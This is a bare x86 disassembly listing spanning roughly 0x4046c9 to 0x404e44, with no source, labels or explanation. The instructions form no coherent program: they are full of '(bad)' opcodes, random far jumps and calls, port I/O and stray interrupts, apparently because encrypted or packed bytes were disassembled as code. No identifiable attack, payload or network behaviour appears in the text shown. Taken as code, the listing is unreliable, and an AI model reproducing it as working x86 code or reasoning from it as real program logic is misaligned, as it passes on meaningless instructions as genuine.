  4046c9:	sahf   
  4046ca:	inc    ebp
  4046cb:	repz ss ds adc al,0xb
  4046d0:	sub    DWORD PTR [eax],esp
  4046d2:	scas   al,BYTE PTR es:[edi]
  4046d3:	pusha  
  4046d4:	(bad)  
  4046d5:	and    al,0x3f
  4046d7:	pop    eax
  4046d8:	jge    0x40466d
  4046da:	jbe    0x40471a
  4046dc:	stos   DWORD PTR es:[edi],eax
  4046dd:	xchg   esp,eax
  4046de:	ins    DWORD PTR es:[edi],dx
  4046df:	repnz call 0x367b:0xc54ba59a
  4046e7:	xchg   bl,dh
  4046e9:	ss dec esi
  4046eb:	loope  0x404701
  4046ed:	and    al,0x9c
  4046ef:	int    0x2c
  4046f1:	dec    edi
  4046f2:	iret   
  4046f3:	pop    ebp
  4046f4:	test   al,0xf9
  4046f6:	frstor [edi]
  4046f8:	mov    ebx,0xceac4c9d
  4046fd:	out    dx,eax
  4046fe:	dec    ebp
  4046ff:	cwde   
  404700:	adc    eax,0x20c2897d
  404705:	shr    DWORD PTR [edi+0x41],cl
  404708:	aam    0xac
  40470a:	aam    0x29
  40470c:	sbb    eax,DWORD PTR cs:[ebx-0x20]
  404710:	les    ebp,FWORD PTR [edx]
  404712:	sbb    al,cl
  404714:	or     eax,0x14bcbf86
  404719:	pushf  
  40471a:	jmp    0x91e9:0xd71f053f
  404721:	retf   
  404722:	(bad)  
  404724:	sbb    eax,0xe5c91a06
  404729:	jp     0x40476f
  40472b:	mov    bh,0xc3
  40472d:	or     ecx,ebx
  40472f:	outs   dx,BYTE PTR ds:[esi]
  404730:	or     eax,0x6897e8b4
  404735:	mov    ds:0x9d9b4bed,eax
  40473a:	or     DWORD PTR [ebx+eax*4+0x26611a28],ebx
  404741:	pusha  
  404742:	ror    DWORD PTR [eax],cl
  404744:	int    0x0
  404746:	pop    esp
  404747:	dec    edi
  404748:	adc    ebp,DWORD PTR [esi]
  40474a:	push   ecx
  40474b:	retf   0x8924
  40474e:	sub    eax,0xfa6f4afc
  404753:	pop    ds
  404754:	bound  edx,QWORD PTR [eax-0x1f5df8b5]
  40475a:	iret   
  40475b:	adc    DWORD PTR [eax],edi
  40475d:	push   edi
  40475e:	test   DWORD PTR [ecx],esi
  404760:	stc    
  404761:	fs pop ebp
  404763:	xor    cl,BYTE PTR [eax+0x72]
  404766:	jmp    0x40470e
  404768:	inc    eax
  404769:	fisubr DWORD PTR [ebx+ebp*4]
  40476c:	xchg   ebp,eax
  40476d:	fcmove st,st(3)
  40476f:	std    
  404770:	mov    dh,0xe6
  404772:	fidivr DWORD PTR es:[esi-0x312ef886]
  404779:	add    al,0x47
  40477b:	xchg   ebx,eax
  40477c:	lock into 
  40477e:	and    DWORD PTR [edx-0x35],ebx
  404781:	aas    
  404782:	xchg   edx,eax
  404783:	add    eax,0x74d40a9f
  404788:	cmovg  ebp,DWORD PTR ds:0x959b198b
  40478f:	out    dx,eax
  404790:	pop    ebp
  404791:	es in  eax,dx
  404793:	pusha  
  404794:	(bad)  
  404795:	out    dx,al
  404796:	mov    cl,0xd5
  404798:	pusha  
  404799:	mov    edx,0xbeeda38d
  40479e:	sahf   
  40479f:	sti    
  4047a0:	in     al,dx
  4047a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047a2:	xchg   edx,eax
  4047a3:	pop    ebx
  4047a4:	cmp    ah,BYTE PTR [esi-0x2a]
  4047a7:	ret    0xdfa6
  4047aa:	xor    eax,0x79628091
  4047af:	push   edx
  4047b0:	adc    DWORD PTR [edx],esi
  4047b2:	fwait
  4047b3:	mov    ch,0x15
  4047b5:	(bad)  
  4047b6:	cmp    ch,BYTE PTR [ecx-0x24]
  4047b9:	pop    ss
  4047ba:	outs   dx,BYTE PTR ds:[esi]
  4047bb:	xchg   ecx,eax
  4047bc:	cwde   
  4047bd:	sbb    BYTE PTR ss:[esi+eax*2],ah
  4047c1:	ror    al,cl
  4047c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c5:	xor    bl,BYTE PTR [edi]
  4047c7:	daa    
  4047c8:	adc    al,0xbc
  4047ca:	out    dx,eax
  4047cb:	xor    edx,DWORD PTR [ebx-0x4c7e5e04]
  4047d1:	nop
  4047d2:	xchg   BYTE PTR [ecx+ebp*8-0x6e],bh
  4047d6:	inc    edx
  4047d7:	jnp    0x404855
  4047d9:	sub    DWORD PTR [esi+0x1d],ebp
  4047dc:	call   0x9680de69
  4047e1:	pusha  
  4047e2:	into   
  4047e3:	mov    eax,ds:0x28fafcc5
  4047e8:	loopne 0x4047a5
  4047ea:	ins    BYTE PTR es:[edi],dx
  4047eb:	fbld   TBYTE PTR [ebx+0x2cc34d67]
  4047f1:	lock int3 
  4047f3:	mov    ebx,0x1576c8f1
  4047f8:	hlt    
  4047f9:	xchg   esp,eax
  4047fa:	shr    edx,0x15
  4047fd:	xchg   esi,eax
  4047fe:	mov    dl,0x8b
  404800:	jae    0x4047b8
  404802:	pop    ebp
  404804:	push   ebx
  404805:	xchg   edx,eax
  404806:	dec    esi
  404807:	mov    cl,ah
  404809:	mov    WORD PTR [edx],ss
  40480b:	pop    DWORD PTR [ebp+0x61]
  40480e:	clc    
  40480f:	cmp    ah,BYTE PTR [edx]
  404811:	mov    dl,0xc7
  404813:	ins    DWORD PTR es:[edi],dx
  404814:	ret    
  404815:	in     eax,0xb3
  404817:	push   ss
  404818:	ds jmp 0x4047d7
  40481b:	fcom   DWORD PTR [esi]
  40481d:	(bad)  
  40481e:	daa    
  40481f:	in     al,0xdb
  404821:	pop    ecx
  404822:	mov    bh,0x3c
  404824:	jbe    0x40489b
  404826:	sti    
  404827:	(bad)
  40482a:	sub    DWORD PTR gs:[ebx],esi
  40482d:	(bad)  
  40482e:	sbb    BYTE PTR [ebx-0x37],dl
  404831:	mov    al,0x58
  404833:	sahf   
  404834:	mov    ebx,0xc4ebf83f
  404839:	pop    ss
  40483a:	loope  0x4048b7
  40483c:	mov    eax,ds:0x11c435d6
  404841:	scas   eax,DWORD PTR es:[edi]
  404842:	cli    
  404843:	ror    BYTE PTR [esi],0x28
  404846:	rol    esp,1
  404848:	adc    dh,bh
  40484a:	adc    al,0xe9
  40484c:	out    dx,eax
  40484d:	add    bh,bl
  40484f:	mov    dl,BYTE PTR [ecx-0x748d79ec]
  404855:	push   edx
  404856:	inc    esp
  404857:	ins    BYTE PTR es:[edi],dx
  404858:	int3   
  404859:	popf   
  40485a:	test   al,0x63
  40485c:	ins    DWORD PTR es:[edi],dx
  40485d:	mov    ebp,0x26016fd5
  404862:	sub    ebx,DWORD PTR [edi-0x59]
  404865:	mov    al,0xe9
  404867:	test   BYTE PTR [ebp-0x38],al
  40486a:	mov    esp,0x84f7d45e
  40486f:	jo     0x404813
  404871:	fcomip st,st(6)
  404873:	(bad)  
  404874:	pop    ebx
  404875:	cdq    
  404876:	inc    edi
  404877:	imul   ebp,esp,0x91fb7262
  40487d:	sbb    bl,BYTE PTR [eax-0x6b]
  404880:	mov    ch,BYTE PTR [ebx+ecx*4-0x5dacbe2a]
  404887:	ds push esp
  404889:	sti    
  40488a:	push   eax
  40488b:	ins    BYTE PTR es:[edi],dx
  40488c:	mov    esp,0xdba9c73f
  404891:	and    al,0x37
  404893:	xchg   ebp,eax
  404894:	rcl    BYTE PTR [eax],cl
  404896:	mov    esi,0x16e1c22
  40489b:	dec    edi
  40489c:	inc    ecx
  40489d:	add    edi,DWORD PTR [eax]
  40489f:	pop    esi
  4048a0:	stos   DWORD PTR es:[edi],eax
  4048a1:	loope  0x404910
  4048a3:	int3   
  4048a4:	inc    eax
  4048a5:	cmp    esi,0x31
  4048a8:	inc    edi
  4048a9:	out    dx,eax
  4048aa:	sub    eax,0x5dd05f23
  4048af:	aaa    
  4048b0:	and    al,0x8
  4048b2:	test   ebp,ecx
  4048b4:	jle    0x404838
  4048b6:	repnz (bad) 
  4048b8:	stos   BYTE PTR es:[edi],al
  4048b9:	adc    BYTE PTR [eax],0x5e
  4048bc:	dec    edx
  4048bd:	cwde   
  4048be:	jne    0x404888
  4048c0:	dec    esi
  4048c1:	inc    eax
  4048c2:	jmp    0x3d7f2f44
  4048c7:	inc    esp
  4048c8:	loopne 0x4048f4
  4048ca:	dec    eax
  4048cb:	fs cli 
  4048cd:	xchg   ebp,eax
  4048ce:	sub    BYTE PTR [ebx],cl
  4048d0:	jne    0x4048e1
  4048d2:	repz xchg esi,eax
  4048d4:	outs   dx,BYTE PTR ds:[esi]
  4048d5:	xchg   BYTE PTR [eax-0x15651154],bh
  4048db:	jmp    0x7f1:0x7f86f51
  4048e2:	push   es
  4048e3:	cmc    
  4048e4:	and    BYTE PTR [edx],bh
  4048e6:	add    al,BYTE PTR [eax]
  4048e8:	pop    ebx
  4048e9:	xchg   ebp,eax
  4048ea:	lods   eax,DWORD PTR ds:[esi]
  4048eb:	rcr    DWORD PTR [edx-0x2d],0x91
  4048ef:	jmp    0x345e:0x51445ca2
  4048f6:	xor    eax,DWORD PTR [ecx]
  4048f8:	push   edx
  4048f9:	leave  
  4048fa:	jle    0x4048d6
  4048fc:	lock aas 
  4048fe:	jle    0x40489b
  404900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404901:	dec    ecx
  404902:	pop    ecx
  404903:	je     0x404907
  404905:	test   DWORD PTR [edi+0x7b],0x94fb3c2d
  40490c:	sub    DWORD PTR [ebx-0x62],ebp
  40490f:	jns    0x404988
  404911:	jmp    0x404957
  404913:	call   0x19a6:0x8b19e7d2
  40491a:	mov    eax,ds:0xe6c37434
  40491f:	sbb    al,0xb1
  404921:	leave  
  404922:	mov    gs,eax
  404924:	jl     0x404915
  404926:	sub    BYTE PTR [edx+ebx*8+0x82b13f8],0x27
  40492e:	(bad)  
  40492f:	inc    ebp
  404930:	(bad)
  404933:	dec    eax
  404934:	add    al,0xeb
  404936:	ins    DWORD PTR es:[edi],dx
  404937:	mov    ds:0xdc13f16d,eax
  40493c:	pop    ss
  40493d:	and    ch,BYTE PTR [ebp+ecx*8-0x3b]
  404941:	fmul   st(3),st
  404943:	into   
  404944:	stos   DWORD PTR es:[edi],eax
  404945:	gs jecxz 0x4049b4
  404948:	sub    eax,0xdf1b5eb9
  40494d:	mov    ch,0x68
  40494f:	sahf   
  404950:	popa   
  404951:	jle    0x4048f3
  404953:	sbb    al,0x3b
  404955:	mov    bl,0x5c
  404957:	enter  0x68ff,0xc4
  40495b:	inc    ecx
  40495c:	xlat   BYTE PTR ds:[ebx]
  40495d:	stc    
  40495e:	frstor [eax+0x68]
  404961:	shr    bl,cl
  404963:	lahf   
  404964:	jb     0x40494e
  404966:	adc    BYTE PTR ds:0xbf88b763,al
  40496c:	mov    ax,ds:0x7b7f5f1d
  404972:	jg     0x4049cd
  404974:	mov    edi,0x1500ce8c
  404979:	xchg   esi,eax
  40497a:	mov    ch,BYTE PTR [edi+ecx*1-0x6c879cfa]
  404981:	sbb    BYTE PTR [eax],ah
  404983:	inc    edx
  404984:	push   eax
  404985:	and    ch,BYTE PTR ds:0x23ec4c78
  40498b:	fimul  DWORD PTR [esi]
  40498d:	xor    cl,BYTE PTR [ebx]
  40498f:	sahf   
  404990:	nop
  404991:	push   ds
  404992:	mov    dl,0x47
  404994:	add    BYTE PTR [esi-0x6f],al
  404997:	(bad)  
  404999:	jns    0x59b5858b
  40499f:	int3   
  4049a0:	jae    0x40498f
  4049a2:	loope  0x404932
  4049a4:	lock xchg ebx,eax
  4049a6:	mov    ebp,0x70ec0f66
  4049ab:	pop    ebp
  4049ac:	xchg   esp,eax
  4049ad:	clc    
  4049ae:	and    eax,0x3d1f399c
  4049b3:	out    0xed,eax
  4049b5:	mov    edx,0x2a10d470
  4049ba:	mov    ds:0xc7e1c770,al
  4049bf:	popa   
  4049c0:	mov    cl,0xf1
  4049c2:	mov    ebx,0x273a8af4
  4049c7:	jl     0x4049ea
  4049c9:	es icebp 
  4049cb:	jno    0x4049e9
  4049cd:	push   esi
  4049ce:	mov    ds,WORD PTR [eax]
  4049d0:	add    al,0x73
  4049d2:	enter  0x6c95,0x2e
  4049d6:	retf   0x9af3
  4049d9:	jae    0x404a25
  4049db:	sar    DWORD PTR [eax-0x43],1
  4049de:	jno    0x404a24
  4049e0:	fucomi st,st(1)
  4049e2:	cmp    eax,0xf9c7052c
  4049e7:	out    dx,eax
  4049e8:	jbe    0x404980
  4049ea:	fadd   DWORD PTR [esi+0x44c481ff]
  4049f0:	aad    0x85
  4049f2:	fist   DWORD PTR [ebp-0x11]
  4049f5:	or     DWORD PTR [edx],esp
  4049f7:	ret    0x5f42
  4049fa:	es into 
  4049fc:	retf   0xe2ad
  4049ff:	ss mov dh,0xf1
  404a02:	imul   esp,DWORD PTR [esp+edi*1-0x12],0xf
  404a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a08:	xchg   DWORD PTR [ebx+0x43759c8],ebp
  404a0e:	adc    cl,ch
  404a10:	imul   ebx,DWORD PTR [edx+0x7e6bfecc],0x460faae5
  404a1a:	aad    0xc4
  404a1c:	cmp    bl,ah
  404a1e:	ja     0x404a5e
  404a20:	xchg   esi,eax
  404a21:	into   
  404a22:	js     0x4049c0
  404a24:	push   ecx
  404a25:	and    al,0x20
  404a27:	or     al,al
  404a29:	add    esi,DWORD PTR [ebx-0x4a]
  404a2c:	push   esi
  404a2d:	or     BYTE PTR [eax+0x1b],dh
  404a30:	jge    0x404a44
  404a32:	sar    BYTE PTR [ebx-0x30ad49d4],cl
  404a38:	inc    edi
  404a39:	jne    0x404a26
  404a3b:	fimul  WORD PTR [ecx+0x51]
  404a3e:	cmp    al,0x97
  404a40:	xlat   BYTE PTR ds:[ebx]
  404a41:	cmp    eax,DWORD PTR [eax]
  404a43:	(bad)  [ebx+ebp*2]
  404a46:	dec    esp
  404a47:	adc    dh,BYTE PTR [ecx+edx*1-0x693e9a73]
  404a4e:	js     0x404a4e
  404a50:	or     al,0xd7
  404a52:	mov    ch,0x42
  404a54:	adc    bh,BYTE PTR [edi+0x61]
  404a57:	xlat   BYTE PTR ds:[ebx]
  404a58:	clc    
  404a59:	mov    BYTE PTR [esi],bl
  404a5b:	fsubr  DWORD PTR [ecx+0x74]
  404a5e:	jmp    0x73940a25
  404a63:	ret    0x9bb8
  404a66:	iret   
  404a67:	dec    esi
  404a68:	dec    edx
  404a69:	jb     0x404a2c
  404a6b:	popa   
  404a6c:	(bad)  
  404a6d:	mov    ecx,0x67e4f0af
  404a72:	aad    0x92
  404a74:	js     0x404a0a
  404a76:	jne    0x404a9a
  404a78:	test   eax,0x72070f6f
  404a7d:	in     eax,dx
  404a7e:	enter  0xfcb7,0x8e
  404a82:	ficomp WORD PTR [edi]
  404a84:	push   ebp
  404a85:	jb     0x404adb
  404a87:	add    cl,0x5f
  404a8a:	jb     0x404a83
  404a8c:	pop    ds
  404a8d:	jno    0x404ae9
  404a8f:	cdq    
  404a90:	push   ds
  404a91:	adc    dh,BYTE PTR [ebx-0x72]
  404a94:	repz scas al,BYTE PTR es:[edi]
  404a96:	das    
  404a97:	fstp   TBYTE PTR [ecx]
  404a99:	jae    0x404aeb
  404a9b:	cmc    
  404a9c:	out    0x55,al
  404a9e:	lds    edi,FWORD PTR ds:0xac009c58
  404aa4:	mov    al,ds:0x75f3e0d2
  404aa9:	add    ebx,DWORD PTR [ebx+0x39]
  404aac:	xchg   dh,cl
  404aae:	push   edx
  404aaf:	inc    esi
  404ab0:	mov    DWORD PTR ds:0x5d2a42ea,ecx
  404ab6:	or     al,al
  404ab8:	in     al,0x88
  404aba:	aaa    
  404abb:	add    DWORD PTR [edx+0x1799fe75],ecx
  404ac1:	push   edx
  404ac2:	sti    
  404ac3:	push   ecx
  404ac4:	loopne 0x404aaf
  404ac6:	test   al,0xee
  404ac8:	nop
  404ac9:	mov    bl,0x7d
  404acb:	push   es
  404acc:	sub    DWORD PTR [eax+esi*8],esi
  404acf:	mov    dh,0xc6
  404ad1:	pop    ds
  404ad2:	push   cs
  404ad3:	aas    
  404ad4:	push   es
  404ad5:	mov    ah,0x9
  404ad7:	or     DWORD PTR [edi],ebp
  404ad9:	daa    
  404ada:	jle    0x404b26
  404adc:	xor    cl,BYTE PTR [ecx+0xf]
  404adf:	inc    edi
  404ae0:	sbb    eax,0xc22c6af
  404ae5:	mov    edx,0xdca2eed3
  404aea:	pop    DWORD PTR [edx+0x78def09a]
  404af0:	mov    dh,0x78
  404af2:	cmp    eax,DWORD PTR [edx+0x4e]
  404af5:	inc    edi
  404af6:	shr    BYTE PTR [ebx-0x66],0x8e
  404afa:	out    0xfc,eax
  404afc:	dec    ebx
  404afd:	stos   DWORD PTR es:[edi],eax
  404afe:	mov    esi,0xc70dcac3
  404b03:	int    0x3d
  404b05:	mov    cl,0x23
  404b07:	(bad)  
  404b08:	cs pop ds
  404b0a:	sbb    al,0x89
  404b0c:	je     0x404b4a
  404b0e:	frstor [ecx]
  404b10:	push   ss
  404b11:	clc    
  404b12:	(bad)  
  404b14:	pop    ebp
  404b15:	add    dl,BYTE PTR [edi-0x73]
  404b18:	sbb    ah,BYTE PTR [ebp+edi*4-0x37]
  404b1c:	or     al,0xfc
  404b1e:	push   eax
  404b1f:	inc    edi
  404b20:	pop    es
  404b21:	jecxz  0x404b06
  404b23:	shr    BYTE PTR [edi],1
  404b25:	fcom   DWORD PTR [edi+0x6e]
  404b28:	out    dx,eax
  404b29:	imul   edx,DWORD PTR [eax-0x1e3878c],0xffffffd6
  404b30:	gs push es
  404b32:	pop    es
  404b33:	add    DWORD PTR [esi+ecx*1+0x1e6ff359],eax
  404b3a:	fiadd  DWORD PTR [ebx+0x1a]
  404b3d:	in     al,0x7
  404b3f:	stc    
  404b40:	mov    fs,ebp
  404b42:	mov    al,0x5a
  404b44:	sub    BYTE PTR [ecx],ah
  404b46:	aad    0x26
  404b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b49:	ffreep st(6)
  404b4b:	je     0x404b9c
  404b4d:	xchg   edi,eax
  404b4e:	scas   al,BYTE PTR es:[edi]
  404b4f:	jmp    0xed3f:0x9dce0d68
  404b56:	pop    ebp
  404b57:	pop    ebx
  404b58:	pop    esp
  404b59:	xor    bh,BYTE PTR [edi-0x1d1949d3]
  404b5f:	push   es
  404b60:	xchg   eax,ebp
  404b62:	outs   dx,BYTE PTR ds:[esi]
  404b63:	bound  edi,QWORD PTR [edi-0xc]
  404b66:	mov    ebx,0xde0665c1
  404b6b:	sbb    al,0x20
  404b6d:	mov    dl,0x5
  404b6f:	add    al,0x1a
  404b71:	cli    
  404b72:	push   DWORD PTR [edi-0x74]
  404b75:	div    DWORD PTR ds:0x26b243e7
  404b7b:	push   ecx
  404b7c:	in     eax,0xc7
  404b7e:	fidiv  DWORD PTR [ecx]
  404b80:	cmc    
  404b81:	bound  ecx,QWORD PTR [edx]
  404b83:	lods   al,BYTE PTR ds:[esi]
  404b84:	pop    edi
  404b85:	push   ecx
  404b86:	mov    ch,0xc9
  404b88:	jp     0x404bd7
  404b8a:	out    0x85,al
  404b8c:	adc    ah,ch
  404b8e:	xchg   ebp,eax
  404b8f:	std    
  404b90:	out    0xb6,eax
  404b92:	lea    ebx,[ecx-0xf3b8fe9]
  404b98:	retf   
  404b99:	int    0x77
  404b9b:	in     eax,dx
  404b9c:	xor    sp,si
  404b9f:	ins    BYTE PTR es:[edi],dx
  404ba0:	das    
  404ba1:	sub    eax,0x98710cd3
  404ba6:	mov    bl,0xa4
  404ba8:	sbb    DWORD PTR [ebp+ecx*2-0x79],ebx
  404bac:	fidiv  WORD PTR [ebx]
  404bae:	dec    esp
  404baf:	mov    dl,0x78
  404bb1:	jle    0x404c22
  404bb3:	add    BYTE PTR [ebx],dl
  404bb5:	jno    0x404bdb
  404bb7:	test   al,0x46
  404bb9:	int    0x28
  404bbb:	je     0x404b4f
  404bbd:	pop    edi
  404bbe:	(bad)  
  404bbf:	retf   
  404bc0:	and    dl,BYTE PTR [ebp+0x4e13141c]
  404bc6:	jbe    0x404b6a
  404bc8:	aam    0x8e
  404bca:	xchg   edx,eax
  404bcb:	rcl    DWORD PTR [ecx+0x4f],cl
  404bce:	sahf   
  404bcf:	stc    
  404bd0:	inc    esi
  404bd1:	test   eax,0xee760bd
  404bd6:	in     al,dx
  404bd7:	popf   
  404bd8:	loope  0x404c37
  404bda:	setns  BYTE PTR [esi+0x53]
  404bde:	push   0xffffff8e
  404be0:	push   es
  404be1:	retf   0x73cf
  404be4:	in     al,dx
  404be5:	lds    edx,FWORD PTR [esi]
  404be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404be8:	call   0xbd3a:0x46a15297
  404bef:	std    
  404bf0:	sbb    DWORD PTR fs:[edi],0x9eb94910
  404bf7:	sub    eax,0x68f13d9
  404bfc:	stos   DWORD PTR es:[edi],eax
  404bfd:	repnz mov ecx,0xca965edc
  404c03:	std    
  404c04:	sub    dl,0xd6
  404c07:	sbb    eax,0xe3186616
  404c0c:	jne    0x404c4f
  404c0e:	jae    0x404bf6
  404c10:	daa    
  404c11:	fisttp DWORD PTR [edi+0xa09a172]
  404c17:	ret    
  404c18:	mov    ebp,esp
  404c1a:	xor    DWORD PTR [ecx-0x1],edi
  404c1d:	into   
  404c1e:	dec    ebx
  404c1f:	mov    ds,WORD PTR [edx+esi*1+0xb]
  404c23:	test   DWORD PTR [edx+esi*2-0x4e6668c4],0x9b989a81
  404c2e:	or     dl,dh
  404c30:	cdq    
  404c31:	mov    cl,0xa5
  404c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c34:	in     eax,dx
  404c35:	cdq    
  404c36:	pop    edi
  404c37:	lds    eax,FWORD PTR [ecx]
  404c39:	sub    esi,ecx
  404c3b:	push   edx
  404c3c:	retf   0x11a2
  404c3f:	lods   al,BYTE PTR ds:[esi]
  404c40:	cdq    
  404c41:	mov    eax,0x46e8ebd3
  404c46:	adc    edx,DWORD PTR [ebx]
  404c48:	xor    BYTE PTR [ebp-0x388f6e94],cl
  404c4e:	push   cs
  404c4f:	icebp  
  404c50:	sbb    eax,0x5536188e
  404c55:	cmp    eax,0x63a94b85
  404c5a:	repnz ficomp DWORD PTR ds:[ebp+ecx*2+0x46]
  404c60:	cmp    eax,0x96d7ae86
  404c65:	sub    BYTE PTR [ebx],dl
  404c67:	xor    eax,0x860ca61b
  404c6c:	or     eax,0x2f248f08
  404c71:	mov    al,0x5f
  404c73:	xchg   edx,eax
  404c74:	pop    esi
  404c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c76:	mov    bl,0xe3
  404c78:	push   es
  404c79:	jnp    0x404c08
  404c7b:	xlat   BYTE PTR ds:[ebx]
  404c7c:	lock mov bl,0x8a
  404c7f:	adc    eax,DWORD PTR [edi+0x6d842f98]
  404c85:	ins    DWORD PTR es:[edi],dx
  404c86:	scas   al,BYTE PTR es:[edi]
  404c87:	jb     0x404c52
  404c89:	adc    BYTE PTR [esi+0xc],dl
  404c8c:	sbb    eax,0xd99b7c85
  404c91:	cmp    ah,BYTE PTR [ecx-0x2e]
  404c94:	lods   al,BYTE PTR ds:[esi]
  404c95:	sub    BYTE PTR [ebp+0x2035db81],dh
  404c9b:	jp     0x404c25
  404c9d:	mov    BYTE PTR [eax],bh
  404c9f:	loopne 0x404c6f
  404ca1:	jno    0x404c8d
  404ca3:	mov    ebx,edx
  404ca5:	xor    al,0xad
  404ca7:	jb     0x404d18
  404ca9:	pop    ds
  404caa:	in     eax,0x9d
  404cac:	inc    eax
  404cad:	mov    al,0xa8
  404caf:	mov    ds:0x31ecb5b7,al
  404cb4:	shr    edi,0xcb
  404cb7:	sbb    ah,BYTE PTR [ecx+0x53d507fb]
  404cbd:	dec    edi
  404cbe:	sbb    DWORD PTR es:[edx+0x746d0423],edi
  404cc5:	in     eax,dx
  404cc6:	push   ebp
  404cc7:	fld    QWORD PTR ds:0xd86ab8e2
  404ccd:	add    al,0xb7
  404ccf:	test   al,0x8f
  404cd1:	fbstp  TBYTE PTR [ebp-0x572e0d31]
  404cd7:	jnp    0x404cd0
  404cd9:	ss sub esp,ebp
  404cdc:	cld    
  404cdd:	dec    edi
  404cde:	test   al,0x4
  404ce0:	cmp    eax,0xfe967523
  404ce5:	xor    edx,DWORD PTR [edi+0x47]
  404ce8:	jne    0x404c8b
  404cea:	in     eax,0x43
  404cec:	cmp    al,0x6c
  404cee:	dec    ebx
  404cef:	loop   0x404c9a
  404cf1:	(bad)  
  404cf2:	cmp    BYTE PTR [ecx+0x294966b2],ah
  404cf8:	idiv   BYTE PTR [eax+0x641e1a0e]
  404cfe:	push   edx
  404cff:	add    eax,0x11d8240e
  404d04:	push   ebx
  404d05:	ror    DWORD PTR ds:0x65e8405b,1
  404d0b:	push   ss
  404d0c:	in     eax,dx
  404d0d:	xchg   ebp,eax
  404d0e:	mov    BYTE PTR [esi+0x30],dh
  404d11:	loope  0x404cc0
  404d13:	adc    al,0xc3
  404d15:	mov    esp,DWORD PTR ds:0x7f2e2603
  404d1b:	loopne 0x404d4e
  404d1d:	inc    BYTE PTR [eax+0x6c7512d5]
  404d23:	mov    DWORD PTR [edx-0x42eaee15],ebp
  404d29:	ins    DWORD PTR es:[edi],dx
  404d2a:	mov    cs,WORD PTR [edx-0x59]
  404d2d:	mov    WORD PTR [edi-0x43],cs
  404d30:	push   edi
  404d31:	and    esi,eax
  404d33:	cmp    dh,BYTE PTR [ebx]
  404d35:	pop    eax
  404d36:	and    BYTE PTR [edx-0x7c891ab4],dl
  404d3c:	push   ecx
  404d3d:	lods   al,BYTE PTR ds:[esi]
  404d3e:	sbb    esp,ebx
  404d40:	(bad)  
  404d41:	cld    
  404d42:	adc    bh,BYTE PTR [ecx]
  404d44:	xchg   DWORD PTR [edx],esi
  404d46:	stc    
  404d47:	mov    BYTE PTR [ecx],dl
  404d49:	xor    eax,0x921d094c
  404d4e:	rol    esi,1
  404d50:	sbb    al,0xfe
  404d52:	dec    esp
  404d53:	dec    eax
  404d54:	pop    edx
  404d55:	adc    bh,BYTE PTR [ebx-0x68ea73db]
  404d5b:	dec    eax
  404d5c:	dec    ecx
  404d5d:	and    al,0x14
  404d5f:	push   0xffffff88
  404d61:	sti    
  404d62:	xchg   edx,eax
  404d63:	mov    esi,0xc1463799
  404d68:	leave  
  404d69:	cmp    DWORD PTR [ebp+esi*8+0x20],esp
  404d6d:	xchg   edx,eax
  404d6e:	in     eax,0x62
  404d70:	test   esi,edx
  404d72:	jge    0x404d46
  404d74:	call   0xb3a2aac8
  404d79:	dec    ebp
  404d7a:	test   al,0x40
  404d7c:	inc    edi
  404d7d:	mov    esi,0x3e604cf8
  404d82:	sub    BYTE PTR [edx+0x5a],0x10
  404d86:	sbb    al,0xc7
  404d88:	sbb    DWORD PTR [ebx+0x4b759275],0x63
  404d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d90:	jmp    0x404d1f
  404d92:	and    BYTE PTR ds:0xa40706ff,0x8f
  404d99:	and    dl,BYTE PTR [edi-0x59]
  404d9c:	in     al,0x4d
  404d9e:	xchg   esp,eax
  404d9f:	xchg   ecx,eax
  404da0:	dec    edx
  404da1:	mov    eax,ds:0xb7e44b78
  404da6:	jecxz  0x404dd1
  404da8:	jns    0x404d38
  404daa:	sub    eax,0x6e6b543
  404daf:	leave  
  404db0:	fwait
  404db1:	sbb    ch,ah
  404db3:	out    dx,eax
  404db4:	fdivrp st(4),st
  404db6:	ja     0x404e10
  404db8:	les    ecx,FWORD PTR [ebx+ebp*2]
  404dbb:	xor    DWORD PTR [edi-0x3a6ee588],ecx
  404dc1:	push   0xffffffeb
  404dc3:	xchg   ebx,eax
  404dc4:	sbb    ah,cl
  404dc6:	jns    0x404de0
  404dc8:	out    dx,eax
  404dc9:	push   esi
  404dca:	pusha  
  404dcb:	cmp    al,BYTE PTR [ebx+0x7c354283]
  404dd1:	push   es
  404dd2:	push   esi
  404dd3:	dec    ecx
  404dd4:	mov    eax,ds:0x9763f19b
  404dd9:	or     ah,BYTE PTR cs:[edx]
  404ddc:	daa    
  404ddd:	shr    DWORD PTR [edi],1
  404ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de0:	mov    al,ds:0xb6ef7425
  404de5:	dec    BYTE PTR [esi-0x4]
  404de8:	or     al,0x8f
  404dea:	ret    
  404deb:	call   0xbd9b:0xaf94e6ce
  404df2:	jmp    0xe9ee:0x815c63f8
  404df9:	clc    
  404dfa:	adc    BYTE PTR ds:0xcba7063a,al
  404e00:	adc    esp,ebx
  404e02:	push   es
  404e03:	inc    ecx
  404e04:	jns    0x404e3f
  404e06:	mov    esp,ss
  404e08:	sub    al,0x89
  404e0a:	push   ebx
  404e0b:	sahf   
  404e0c:	ins    BYTE PTR es:[edi],dx
  404e0d:	pop    es
  404e0e:	fidiv  DWORD PTR [eax+ebp*4+0x59725bed]
  404e15:	out    0xc9,eax
  404e17:	mov    edi,esi
  404e19:	jne    0x404da0
  404e1b:	jno    0x404dc9
  404e1d:	or     al,BYTE PTR [esp+ecx*2-0x47]
  404e21:	pop    ss
  404e22:	cmp    bl,dh
  404e24:	rcl    BYTE PTR [edx-0xc],1
  404e27:	ds dec ebp
  404e29:	cld    
  404e2a:	popf   
  404e2b:	inc    esi
  404e2c:	dec    eax
  404e2d:	push   ecx
  404e2e:	lock ds xor ax,0x7e27
  404e34:	out    0xe2,al
  404e36:	dec    eax
  404e37:	pop    ebp
  404e38:	inc    eax
  404e39:	or     dl,BYTE PTR [edx-0x6369b185]
  404e3f:	pop    edx
  404e40:	retf   
  404e41:	xor    bh,BYTE PTR [esi+0x12]
  404e44:	cwde   
